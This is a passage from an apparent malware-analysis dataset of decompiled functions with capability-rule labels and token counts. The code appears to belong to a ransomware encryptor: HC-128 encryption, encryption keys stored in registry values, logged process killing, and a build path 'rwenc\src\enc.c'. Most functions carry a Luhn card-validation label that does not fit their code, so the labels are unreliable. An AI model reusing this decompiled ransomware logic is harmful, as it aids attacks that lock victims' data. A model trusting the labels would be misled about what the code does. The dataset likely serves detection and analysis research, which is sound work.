 fcn.0040c061(var_18h, var_20h, arg_10h_00, 0);\n            var_18h = var_ch;\n            puVar2 = var_1ch;\n            var_20h = var_14h;\n            var_1h._0_1_ = var_1h * '\\x02';\n            var_28h = var_28h + -1;\n            puVar5 = var_10h;\n            puVar3 = var_8h;\n            var_1ch = var_10h;\n            var_14h = puVar1;\n            var_ch = puVar6;\n        } while (var_28h != 0);\n        var_2ch = var_2ch + -1;\n        var_30h = var_30h + -1;\n        var_24h = var_8h;\n        var_10h = puVar2;\n    } while (var_30h != 0);\n    for (iVar4 = 0x14; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *arg_8h = *var_8h;\n        var_8h = var_8h + 1;\n        arg_8h = arg_8h + 1;\n    }\n    for (iVar4 = 0x14; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *arg_ch = *puVar6;\n        puVar6 = puVar6 + 1;\n        arg_ch = arg_ch + 1;\n    }\n    return;\n}\n",
        "token_count": 1463
    },
    "0040b9bd": {
        "rules": [
            "encrypt data using HC-128/f6b71aea27f34766a10ff27131cf0227"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b9bd(uint32_t *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 5;\n    arg_8h[0x14] = 0;\n    arg_8h[0x15] = 0;\n    puVar4 = arg_8h + 2;\n    puVar5 = puVar4;\n    do {\n        uVar2 = puVar5[-1];\n        uVar10 = puVar5[-2];\n        uVar7 = (uVar2 >> 0x1f) >> 6;\n        uVar8 = uVar7 + uVar10;\n        uVar6 = uVar2 + CARRY4(uVar7, uVar10);\n        uVar3 = uVar8 >> 0x1a;\n        uVar9 = uVar3 | uVar6 * 0x40;\n        uVar7 = *puVar5;\n        *puVar5 = *puVar5 + uVar9;\n        puVar5[-1] = (uVar2 - ((uVar6 >> 0x1a) << 0x1a | uVar6 & 0x3ffffff)) - (uVar10 < (uVar8 & 0xfc000000));\n        puVar5[1] = puVar5[1] + (uVar6 >> 0x1a) + CARRY4(uVar7, uVar9);\n        uVar2 = puVar5[1];\n        puVar5[-2] = uVar10 + uVar3 * -0x4000000;\n        uVar10 = *puVar5;\n        uVar7 = (uVar2 >> 0x1f) >> 7;\n        uVar8 = uVar7 + uVar10;\n        uVar6 = uVar2 + CARRY4(uVar7, uVar10);\n        uVar3 = uVar8 >> 0x19;\n        uVar9 = uVar3 | uVar6 * 0x80;\n        puVar1 = puVar5 + 2;\n        uVar7 = *puVar1;\n        *puVar1 = *puVar1 + uVar9;\n        *puVar5 = uVar10 + uVar3 * -0x2000000;\n        puVar5[3] = puVar5[3] + (uVar6 >> 0x19) + CARRY4(uVar7, uVar9);\n        puVar5[1] = (uVar2 - ((uVar6 >> 0x19) << 0x19 | uVar6 & 0x1ffffff)) - (uVar10 < (uVar8 & 0xfe000000));\n        puVar5 = puVar5 + 4;\n        var_8h = var_8h + -1;\n    } while (var_8h != 0);\n    uVar2 = arg_8h[0x14];\n    uVar10 = arg_8h[0x15];\n    uVar7 = *arg_8h;\n    *arg_8h = *arg_8h + uVar2 * 0x10;\n    arg_8h[1] = arg_8h[1] + (uVar10 << 4 | uVar2 >> 0x1c) + CARRY4(uVar7, uVar2 * 0x10);\n    uVar7 = *arg_8h;\n    *arg_8h = *arg_8h + uVar2 * 2;\n    arg_8h[1] = arg_8h[1] + (uVar10 << 1 | uVar2 >> 0x1f) + CARRY4(uVar7, uVar2 * 2);\n    uVar7 = *arg_8h;\n    *arg_8h = *arg_8h + uVar2;\n    uVar3 = *arg_8h;\n    arg_8h[1] = arg_8h[1] + uVar10 + CARRY4(uVar7, uVar2);\n    arg_8h[0x14] = 0;\n    arg_8h[0x15] = 0;\n    uVar2 = arg_8h[1];\n    uVar10 = (uVar2 >> 0x1f) >> 6;\n    uVar6 = uVar10 + uVar3;\n    uVar7 = uVar2 + CARRY4(uVar10, uVar3);\n    uVar10 = uVar6 >> 0x1a;\n    uVar8 = uVar10 | uVar7 * 0x40;\n    *arg_8h = uVar3 + uVar10 * -0x4000000;\n    arg_8h[1] = (uVar2 - ((uVar7 >> 0x1a) << 0x1a | uVar7 & 0x3ffffff)) - (uVar3 < (uVar6 & 0xfc000000));\n    uVar2 = *puVar4;\n    *puVar4 = *puVar4 + uVar8;\n    arg_8h[3] = arg_8h[3] + (uVar7 >> 0x1a) + CARRY4(uVar2, uVar8);\n    return;\n}\n",
        "token_count": 1277
    },
    "0040bff1": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bff1(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    \n    uVar5 = 0;\n    puVar4 = arg_8h + 8;\n    do {\n        uVar2 = *(arg_ch + uVar5 * 8);\n        puVar1 = puVar4 + -2;\n        uVar3 = *puVar1;\n        *puVar1 = *puVar1 + uVar2;\n        puVar4[-1] = puVar4[-1] + *(arg_ch + 4 + uVar5 * 8) + CARRY4(uVar3, uVar2);\n        uVar2 = *((arg_ch - arg_8h) + puVar4);\n        uVar3 = *puVar4;\n        *puVar4 = *puVar4 + uVar2;\n        puVar4[1] = puVar4[1] + *((arg_ch - arg_8h) + 4 + puVar4) + CARRY4(uVar3, uVar2);\n        uVar5 = uVar5 + 2;\n        puVar4 = puVar4 + 4;\n    } while (uVar5 < 10);\n    return;\n}\n",
        "token_count": 314
    },
    "00401000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401000(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_ch_00;\n    \n    // [00] -r-x section size 57344 named .text\n    arg_ch_00 = fcn.00406a2a(arg_ch);\n    fcn.00407306(arg_8h, arg_ch_00);\n    return;\n}\n",
        "token_count": 84
    },
    "00401019": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401019(uint32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    \n    arg_8h_00 = fcn.004064cf(arg_ch);\n    if (arg_8h_00 != 0) {\n        uVar2 = fcn.00406a50(arg_8h_00);\n        puVar3 = fcn.00405197(4);\n        if (puVar3 != NULL) {\n            puVar3[1] = 0;\n            *puVar3 = uVar2;\n            if ((*arg_8h | arg_8h[1]) == 0) {\n                arg_8h[2] = puVar3;\n            }\n            else {\n                *(arg_8h[3] + 4) = puVar3;\n            }\n            uVar1 = *arg_8h;\n            *arg_8h = *arg_8h + 1;\n            arg_8h[3] = puVar3;\n            arg_8h[1] = arg_8h[1] + (0xfffffffe < uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 284
    },
    "004010c3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004010c3(int32_t arg_8h)\n\n{\n    uint32_t arg_8h_00;\n    \n    arg_8h_00 = fcn.004064cf(*(arg_8h + 0xc));\n    if (arg_8h_00 != 0) {\n        arg_8h = 0;\n        *0x4215e4 = fcn.00406521(arg_8h_00, &arg_8h);\n        fcn.004051e4(arg_8h_00);\n        arg_8h_00 = *0x4215e4 != 0;\n    }\n    return arg_8h_00;\n}\n",
        "token_count": 155
    },
    "00401116": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401116(int32_t arg_8h)\n\n{\n    uint32_t arg_8h_00;\n    \n    arg_8h_00 = fcn.004064cf(*(arg_8h + 0xc));\n    if (arg_8h_00 != 0) {\n        arg_8h = 0;\n        *0x4215dc = fcn.00406521(arg_8h_00, &arg_8h);\n        fcn.004051e4(arg_8h_00);\n        arg_8h_00 = *0x4215dc != 0;\n    }\n    return arg_8h_00;\n}\n",
        "token_count": 152
    },
    "00401194": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401194(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *arg_8h_00;\n    uint *puVar2;\n    uint *puVar3;\n    \n    iVar1 = fcn.004064cf(*(arg_8h + 0xc));\n    if (iVar1 != 0) {\n        arg_8h = 0;\n        arg_8h_00 = fcn.00406521(iVar1, &arg_8h);\n        fcn.004051e4(iVar1);\n        if (arg_8h_00 == NULL) {\n            iVar1 = 0;\n        }\n        else {\n            iVar1 = 0;\n            if (arg_8h == 0x20) {\n                puVar2 = arg_8h_00;\n                puVar3 = 0x4214e0;\n                for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n                    *puVar3 = *puVar2;\n                    puVar2 = puVar2 + 1;\n                    puVar3 = puVar3 + 1;\n                }\n                iVar1 = 1;\n            }\n            fcn.004051e4(arg_8h_00);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 295
    },
    "004011f1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004011f1(uint arg_8h)\n\n{\n    *0x421654 = 0;\n    *0x421650 = 0;\n    *0x421648 = 0;\n    *0x42164c = 0;\n    fcn.00407450(arg_8h, 0x421648, fcn.00401019);\n    return;\n}\n",
        "token_count": 88
    },
    "00401221": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401221(uint arg_8h)\n\n{\n    *0x421664 = 0;\n    *0x421660 = 0;\n    *0x421658 = 0;\n    *0x42165c = 0;\n    fcn.00407450(arg_8h, 0x421658, fcn.00401019);\n    return;\n}\n",
        "token_count": 87
    },
    "00401270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401270(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004072a6(0x42162c, 0, *(arg_8h + 8));\n    if (iVar1 != 0) {\n        fcn.00407450(arg_8h, 0x42162c, fcn.00401000);\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "004012a2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004012a2(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004072a6(0x421620, 0, *(arg_8h + 8));\n    if (iVar1 != 0) {\n        fcn.00407450(arg_8h, 0x421620, fcn.00401000);\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "004012d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004012d4(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004072a6(0x421614, 0, *(arg_8h + 8));\n    if (iVar1 != 0) {\n        fcn.00407450(arg_8h, 0x421614, fcn.00401000);\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "004013a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004013a0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004072a6(0x421638, 0, *(arg_8h + 8));\n    if (iVar1 != 0) {\n        fcn.00407450(arg_8h, 0x421638, fcn.00401000);\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "004013e5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004013e5(uint arg_8h)\n\n{\n    uint32_t arg_8h_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t var_4h;\n    \n    arg_8h_00 = fcn.0040538f(&var_4h);\n    uVar2 = arg_8h_00;\n    if (arg_8h_00 != 0) {\n        iVar3 = 1;\n        uVar2 = 0;\n        if (1 < var_4h) {\n            do {\n                iVar1 = fcn.00406b9a(*(arg_8h_00 + iVar3 * 4), arg_8h);\n                uVar2 = iVar1 == 0;\n                if (uVar2 != 0) break;\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < var_4h);\n        }\n        fcn.00405381(arg_8h_00);\n    }\n    return uVar2;\n}\n",
        "token_count": 240
    },
    "00401b99": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00401b99(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00407642(0, 0x422028, *0x422024);\n    if (iVar1 != *0x422020) {\n        return 0;\n    }\n    iVar1 = fcn.00405197(*0x422024);\n    if (iVar1 != 0) {\n        fcn.004077f8(0x422000, 0x20, 0x422028, *0x422024, iVar1);\n    }\n    return iVar1;\n}\n",
        "token_count": 135
    },
    "00401beb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00401beb(void)\n\n{\n    int32_t arg_8h;\n    uint uVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    uint var_28h;\n    uint var_24h;\n    code *var_20h;\n    code *var_1ch;\n    uint uStack28;\n    uint uStack24;\n    uint *var_10h;\n    uint var_ch;\n    code *var_8h;\n    uint var_4h;\n    \n    arg_8h = fcn.00401b99();\n    uVar1 = 0;\n    if (arg_8h != 0) {\n        var_28h = 0;\n        var_24h = 0;\n        uStack28 = 0;\n        uStack24 = 0;\n        var_20h = fcn.00405197;\n        var_1ch = fcn.004051e4;\n        uVar1 = fcn.00406c91(arg_8h);\n        arg_8h_00 = fcn.0040cf32(&var_28h, arg_8h, uVar1);\n        if (arg_8h_00 == 0) {\n            fcn.004051e4(arg_8h);\n            uVar1 = 0;\n        }\n        else {\n            fcn.00406625(0x413060, 0x27c, 7, 3, &var_4h);\n            var_10h = &var_4h;\n            var_4h._3_1_ = 0;\n            var_ch = 6;\n            var_8h = fcn.0040109d;\n            iVar2 = fcn.0040748b(arg_8h_00, &var_10h, 1);\n            fcn.0040db7c(&var_28h, arg_8h_00);\n            fcn.004051e4(arg_8h);\n            uVar1 = *0x421680;\n            if (iVar2 == 0) {\n                uVar1 = 0;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 479
    },
    "00401fd6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00401fd6(void)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h;\n    uint var_9ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_60h;\n    uint var_5ch;\n    ushort var_52h;\n    uint var_50h;\n    ushort var_46h;\n    uint var_44h;\n    uint *var_3ah;\n    uint var_34h;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint *var_28h;\n    int32_t var_24h;\n    uint *var_20h;\n    uint *var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00401dd6(&var_4h);\n    if (iVar1 != 0) {\n        arg_8h = fcn.00406582(iVar1, var_4h, 1);\n        fcn.004051e4(iVar1);\n        if (arg_8h == 0) {\n            iVar1 = 0;\n        }\n        else {\n            fcn.00406625(0x413060, 0x5f8, 0xc, 10, &var_44h);\n            var_3ah._0_2_ = 0;\n            fcn.00406625(0x413060, 0xa8b, 10, 10, &var_50h);\n            var_46h = 0;\n            fcn.00406625(0x413060, 0xa14, 7, 10, &var_5ch);\n            var_52h = 0;\n            fcn.00406625(0x413060, 0x54f, 0xf, 0x14, &var_84h);\n            var_70h._0_2_ = 0;\n            fcn.00406625(0x413060, 0x226, 0xb, 0x14, &var_9ch);\n            var_88h._0_2_ = 0;\n            fcn.00406625(0x413060, 0xa68, 0xc, 0xc, &var_6ch);\n            var_60h._0_2_ = 0;\n            fcn.00406625(0x413060, 0x805, 0xb, 8, &var_10h);\n            var_8h._0_2_ = 0;\n            iVar1 = fcn.00406b9a(*0x4215f8, &var_6ch);\n            unique0x00001d00 = &var_44h;\n            var_1ch = &var_10h;\n            if (iVar1 != 0) {\n                var_1ch = *0x4215f8;\n            }\n            var_34h = *0x4215f0;\n            var_30h = &var_50h;\n            var_28h = &var_5ch;\n            var_24h = *0x4215e8 + 2;\n            var_20h = &var_84h;\n            var_18h = &var_9ch;\n            var_14h = *0x4215e0;\n            var_2ch = arg_8h;\n            *0x4215e4 = fcn.004068f5(*0x4215e4, &var_3ah + 2, 5);\n            fcn.004051e4(arg_8h);\n            iVar1 = 1;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 867
    },
    "00402162": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00402162(void)\n\n{\n    uint32_t arg_8h;\n    int32_t arg_8h_00;\n    uint *var_40h;\n    uint var_3ch;\n    uint *var_38h;\n    int32_t var_34h;\n    uint *var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    ushort var_1eh;\n    uint var_1ch;\n    ushort var_12h;\n    uint var_10h;\n    ushort var_6h;\n    uint var_4h;\n    \n    arg_8h = fcn.00401dd6(&var_4h);\n    if (arg_8h != 0) {\n        arg_8h_00 = fcn.00406582(arg_8h, var_4h, 1);\n        fcn.004051e4(arg_8h);\n        if (arg_8h_00 != 0) {\n            fcn.00406625(0x413060, 0x5f8, 0xc, 10, &var_10h);\n            var_6h = 0;\n            fcn.00406625(0x413060, 0xa8b, 10, 10, &var_1ch);\n            var_12h = 0;\n            fcn.00406625(0x413060, 0xa14, 7, 10, &var_28h);\n            var_1eh = 0;\n            var_40h = &var_10h;\n            var_3ch = *0x4215f0;\n            var_38h = &var_1ch;\n            var_30h = &var_28h;\n            var_2ch = *0x4215e8 + 2;\n            var_34h = arg_8h_00;\n            *0x4215dc = fcn.004068f5(*0x4215dc, &var_40h, 3);\n            *0x421668 = fcn.00406ca4(*0x4215dc);\n            fcn.004051e4(arg_8h_00);\n        }\n        arg_8h = arg_8h_00 != 0;\n    }\n    return arg_8h;\n}\n",
        "token_count": 513
    },
    "0040224c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040224c(void)\n\n{\n    int32_t arg_8h;\n    uint arg_ch;\n    uint var_14h;\n    uint *var_ah;\n    int32_t var_4h;\n    \n    fcn.00406625(0x413060, 0xa14, 7, 10, &var_14h);\n    var_ah._0_2_ = 0;\n    unique0x00001d00 = &var_14h;\n    var_4h = *0x4215e8 + 2;\n    *0x4215e0 = fcn.004068f5(*0x4215e0, &var_ah + 2, 1);\n    *0x42166c = fcn.00406ca4(*0x4215e0);\n    arg_8h = fcn.00406c56(*0x4215e0);\n    if (arg_8h != 0) {\n        arg_ch = fcn.00406a50(arg_8h);\n        fcn.004073ab(0x421620, arg_ch);\n        fcn.004051e4(arg_8h);\n    }\n    return 1;\n}\n",
        "token_count": 279
    },
    "004022d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004022d8(void)\n\n{\n    int32_t iVar1;\n    int32_t arg_ch;\n    int32_t arg_ch_00;\n    uint uVar2;\n    uint var_c8h;\n    uint var_a8h;\n    uint var_5ah;\n    uint var_4ch;\n    uint var_48h;\n    ushort var_3eh;\n    uint var_3ch;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ah;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    fcn.00406625(0x413060, 0x4ca, 6, 0x4e, &var_a8h);\n    var_5ah._0_2_ = 0;\n    fcn.00406625(0x413060, 0x89f, 0xb, 6, &var_30h);\n    var_2ah._0_2_ = 0;\n    fcn.00406625(0x413060, 0x5dd, 4, 8, &var_3ch);\n    var_34h._0_2_ = 0;\n    fcn.00406625(0x413060, 0x294, 7, 10, &var_48h);\n    var_3eh = 0;\n    fcn.00406625(0x413060, 0x487, 0xb, 0xc, &var_5ah + 2);\n    var_4ch._0_2_ = 0;\n    var_14h = fcn.00405f4f(0x80000002, &var_a8h, &var_30h, &var_18h, &var_ch);\n    if (var_14h == 0) {\n        var_14h = fcn.00405f4f(0x80000001, &var_a8h, &var_30h, &var_18h, &var_ch);\n    }\n    iVar1 = fcn.00405f4f(0x80000002, &var_a8h, &var_3ch, &var_1ch, &var_10h);\n    if (iVar1 == 0) {\n        unique0x100008f2 = iVar1;\n        iVar1 = fcn.00405f4f(0x80000001, &var_a8h, &var_3ch, &var_1ch, &var_10h);\n    }\n    unique0x100008f6 = iVar1;\n    arg_ch = fcn.00405f4f(0x80000002, &var_a8h, &var_48h, &var_20h, &var_4h);\n    if (arg_ch == 0) {\n        arg_ch = fcn.00405f4f(0x80000001, &var_a8h, &var_48h, &var_20h, &var_4h);\n    }\n    arg_ch_00 = fcn.00405f4f(0x80000002, &var_a8h, &var_5ah + 2, &var_24h, &var_8h);\n    if (arg_ch_00 == 0) {\n        arg_ch_00 = fcn.00405f4f(0x80000001, &var_a8h, &var_5ah + 2, &var_24h, &var_8h);\n    }\n    if ((((((var_14h == 0) || (var_ch != 0x20)) || (var_18h != 3)) ||\n         (((iVar1 == 0 || (var_10h != 0x20)) || ((var_1ch != 3 || ((arg_ch == 0 || (var_4h != 0x58)))))))) ||\n        (var_20h != 3)) || (((arg_ch_00 == 0 || (var_8h != 0x58)) || (var_24h != 3)))) {\n        fcn.0040751e(&var_c8h, 0x421500);\n        var_10h = 0x20;\n        var_ch = 0x20;\n        arg_ch = fcn.00407979(0x4214e0, &var_c8h, 0x20, &var_4h);\n        arg_ch_00 = fcn.00407979(0x413020, &var_c8h, 0x20, &var_8h);\n        fcn.004078cc(&var_c8h, 0x20);\n        if ((arg_ch == 0) || (arg_ch_00 == 0)) {\n            return 0;\n        }\n        fcn.00405228(0x421520, arg_ch, var_4h);\n        fcn.00405228(0x421578, arg_ch_00, var_8h);\n        iVar1 = fcn.00405fcd(0x80000002, &var_a8h, &var_30h, 3, 0x4214e0, var_ch);\n        if (iVar1 == 0) {\n            fcn.00405fcd(0x80000001, &var_a8h, &var_30h, 3, 0x4214e0, var_ch);\n        }\n        iVar1 = fcn.00405fcd(0x80000002, &var_a8h, &var_3ch, 3, 0x421500, var_10h);\n        if (iVar1 == 0) {\n            fcn.00405fcd(0x80000001, &var_a8h, &var_3ch, 3, 0x421500, var_10h);\n        }\n        iVar1 = fcn.00405fcd(0x80000002, &var_a8h, &var_48h, 3, 0x421520, var_4h);\n        if (iVar1 == 0) {\n            fcn.00405fcd(0x80000001, &var_a8h, &var_48h, 3, 0x421520, var_4h);\n        }\n        iVar1 = fcn.00405fcd(0x80000002, &var_a8h, &var_5ah + 2, 3, 0x421578, var_8h);\n        if (iVar1 == 0) {\n            fcn.00405fcd(0x80000001, &var_a8h, &var_5ah + 2, 3, 0x421578, var_8h);\n        }\n    }\n    else {\n        fcn.00405228(0x4214e0, var_14h, 0x20);\n        fcn.00405228(0x421500, iVar1, 0x20);\n        fcn.00405228(0x421520, arg_ch, 0x58);\n        fcn.00405228(0x421578, arg_ch_00, 0x58);\n    }\n    if (var_14h != 0) {\n        fcn.004051e4(var_14h);\n    }\n    if (stack0xffffffd4 != 0) {\n        fcn.004051e4(stack0xffffffd4);\n    }\n    fcn.004051e4(arg_ch);\n    fcn.004051e4(arg_ch_00);\n    uVar2 = fcn.00406582(0x421520, var_4h, 0);\n    return uVar2;\n}\n",
        "token_count": 1786
    },
    "00402b54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402b54(uint noname_0, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_10h;\n    \n    iVar1 = fcn.00402c39(arg_ch + 0x24);\n    if (iVar1 != 0) {\n        arg_10h = 0x4216a0;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n        fcn.00405082(7, L\"[DBG] \", arg_10h);\n        fcn.00405082(8, L\"kill \\\"%s.exe\\\"\\r\\n\", arg_ch + 0x24);\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n        fcn.0040460c(*(arg_ch + 8));\n    }\n    return iVar1;\n}\n",
        "token_count": 187
    },
    "00402baf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402baf(uint noname_0, uint arg_ch)\n\n{\n    int32_t arg_ch_00;\n    int32_t arg_8h;\n    uint arg_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_ch_00 = fcn.00401dd6(&var_4h);\n    if (arg_ch_00 != 0) {\n        arg_8h = fcn.0040410a(arg_ch);\n        if (arg_8h != 0) {\n            arg_ch_00 = fcn.004088d4(arg_8h, arg_ch_00, var_4h, &var_ch, &var_8h);\n            arg_10h = 0x4216a0;\n            (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n            fcn.00405082(7, L\"[DBG] \", arg_10h);\n            fcn.00405082(8, 0x40f494, arg_8h);\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n            fcn.004051e4(arg_8h);\n            if (arg_ch_00 == 0) {\n                return;\n            }\n        }\n        fcn.004051e4(arg_ch_00);\n    }\n    return;\n}\n",
        "token_count": 303
    },
    "00402ca2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.00402ca2(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint var_4ch;\n    ushort var_26h;\n    uint var_24h;\n    uint var_ah;\n    uint var_2h;\n    \n    if (arg_ch == 0) {\n        bVar2 = true;\n    }\n    else {\n        fcn.00406a50(arg_8h);\n        fcn.00406a50(arg_ch);\n        fcn.00406625(0x413060, 0x24b, 0xd, 0x1a, &var_24h);\n        var_ah._0_2_ = 0;\n        fcn.00406625(0x413060, 0x337, 5, 0x26, &var_4ch);\n        var_26h = 0;\n        iVar1 = fcn.00406b9a(arg_ch, &var_24h);\n        if ((iVar1 == 0) || (iVar1 = fcn.00406b9a(arg_ch, &var_4ch),  iVar1 == 0)) {\n            bVar2 = true;\n        }\n        else {\n            iVar1 = fcn.00406eda(arg_8h, &var_24h);\n            if (iVar1 == 0) {\n                iVar1 = fcn.00407267(0x421614, arg_ch);\n                bVar2 = iVar1 == 0;\n            }\n            else {\n                fcn.00406625(0x413060, 0xaa4, 0xc, 6, &var_ah + 2);\n                var_2h._0_2_ = 0;\n                iVar1 = fcn.00406eda(arg_8h, &var_ah + 2);\n                bVar2 = iVar1 != 0;\n            }\n        }\n    }\n    return bVar2;\n}\n",
        "token_count": 465
    },
    "00402d7e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402d7e(uint arg_8h, int32_t arg_ch)\n\n{\n    *(arg_ch + 0x14c) = 2;\n    fcn.00408147(arg_8h, 0, 0, arg_ch);\n    return;\n}\n",
        "token_count": 65
    },
    "00402da0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00402da0(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_10h;\n    \n    iVar1 = fcn.00407fcd(arg_8h, *(arg_ch + 0x14), 0);\n    if (iVar1 == 0) {\n        arg_10h = 0x4216a0;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n        fcn.00405082(0xc, L\"[ERR] \", arg_10h);\n        fcn.00405c89();\n        fcn.00405082(4, L\" err:%s:%d\\r\\n\", *(arg_ch + 0x18));\n        fcn.00405082(4, L\"      %S:%S:%lu\\r\\n\", \"D:\\\\1\\\\rwenc\\\\src\\\\enc.c\");\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4216a0);\n        fcn.00402e24(arg_8h, arg_ch);\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 244
    },
    "00402e24": {
        "rules": [
